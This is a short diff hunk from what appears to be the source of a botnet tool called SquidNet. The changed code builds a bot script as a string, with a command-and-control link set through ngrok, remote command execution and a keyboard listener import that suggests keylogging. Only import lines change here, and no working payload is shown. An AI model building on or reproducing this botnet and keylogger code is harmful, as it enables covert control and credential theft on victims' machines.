@@ -1217,8 +1217,8 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         the in-built commands or run any other instructions with command prompt/terminal."""
         script = """
 #-----SquidNet-Bot-Script-----#
-import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
-import subprocess, re
+import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re
+from datetime import datetime, timedelta
 try:
     from pynput.keyboard import Listener # pip install pynput
 except:
